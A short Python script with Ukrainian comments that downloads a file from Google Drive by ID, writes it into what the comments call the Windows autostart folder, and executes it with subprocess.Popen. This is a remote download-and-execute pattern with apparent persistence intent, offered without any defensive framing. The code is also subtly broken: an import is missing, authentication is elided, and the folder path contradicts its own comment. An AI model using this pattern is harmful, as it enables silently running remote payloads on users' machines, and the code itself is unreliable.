from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
import io, os, subprocess

# Налаштування Google Drive API (замініть своїми обліковими даними)
SCOPES = ['https://www.googleapis.com/auth/drive.readonly']
creds = None
# ... (код аутентифікації OAuth2) ...

# Drive API сервіс
service = build('drive', 'v3', credentials=creds)

# Знайти та завантажити файл
file_id = 'YOUR_FILE_ID'  # Замініть на фактичний ідентифікатор файлу
request = service.files().get_media(fileId=file_id)
fh = io.BytesIO()
downloader = MediaIoBaseDownload(fh, request)
done = False
while done is False:
    status, done = downloader.next_chunk()

# Папка автозавантаження Windows
boot_folder = os.environ['WINDIR'] + '\Users\Public\Downloads'  # Припускаючи 'C:\Windows\System'
file_path = os.path.join(boot_folder, 'downloaded_file.ext') # Замініть 'downloaded_file.ext' на фактичну назву файлу та розширення

# Збережіть файл
with open(file_path, 'wb') as f:
    f.write(fh.getvalue())

# Запустіть інсталяцію (налаштуйте для вашого типу файлу)
subprocess.Popen([file_path]) 
